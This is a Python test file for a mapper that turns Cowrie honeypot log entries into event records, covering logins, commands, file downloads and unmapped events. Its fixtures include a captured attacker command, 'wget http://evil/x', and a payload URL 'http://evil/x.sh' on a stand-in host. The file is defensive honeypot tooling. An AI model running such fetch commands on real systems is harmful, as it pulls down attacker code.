"""Tests for the Cowrie -> OTG schema mapper."""

from worker.cowrie_mapper import map_cowrie_event, map_cowrie_lines


def test_login_failed_maps_to_login_attempt():
    entry = {
        "eventid": "cowrie.login.failed",
        "timestamp": "2026-06-01T12:00:00.000000Z",
        "src_ip": "203.0.113.42",
        "src_port": 54321,
        "dst_port": 2222,
        "username": "root",
        "password": "admin",
        "session": "abc123",
        "sensor": "cowrie-prod-01",
    }
    event = map_cowrie_event(entry)
    assert event is not None
    assert event["event_type"] == "login_attempt"
    assert event["source_ip"] == "203.0.113.42"
    assert event["protocol"] == "ssh"
    assert event["success"] is False
    assert event["raw_event"] == entry
    assert event["event_id"]  # generated uuid


def test_login_success_sets_success_true():
    event = map_cowrie_event(
        {"eventid": "cowrie.login.success", "username": "root", "dst_port": 2223}
    )
    assert event["event_type"] == "login_success"
    assert event["success"] is True
    assert event["protocol"] == "telnet"


def test_command_input_maps_command():
    event = map_cowrie_event(
        {"eventid": "cowrie.command.input", "input": "wget http://evil/x", "protocol": "ssh"}
    )
    assert event["event_type"] == "command_exec"
    assert event["command"] == "wget http://evil/x"


def test_file_download_maps_url_and_hash():
    event = map_cowrie_event(
        {
            "eventid": "cowrie.session.file_download",
            "url": "http://evil/x.sh",
            "shasum": "deadbeef",
        }
    )
    assert event["event_type"] == "file_download"
    assert event["payload_url"] == "http://evil/x.sh"
    assert event["payload_hash"] == "deadbeef"


def test_sensor_id_override_wins():
    event = map_cowrie_event(
        {"eventid": "cowrie.session.connect", "sensor": "from-log"}, sensor_id="override"
    )
    assert event["sensor_id"] == "override"


def test_unmapped_event_returns_none():
    assert map_cowrie_event({"eventid": "cowrie.client.version"}) is None
    assert map_cowrie_event({"no_eventid": True}) is None


def test_map_lines_skips_blank_and_invalid():
    lines = [
        '{"eventid": "cowrie.login.failed", "src_ip": "1.2.3.4"}',
        "",
        "not json",
        '{"eventid": "cowrie.client.version"}',  # unmapped
    ]
    events = map_cowrie_lines(lines)
    assert len(events) == 1
    assert events[0]["source_ip"] == "1.2.3.4"
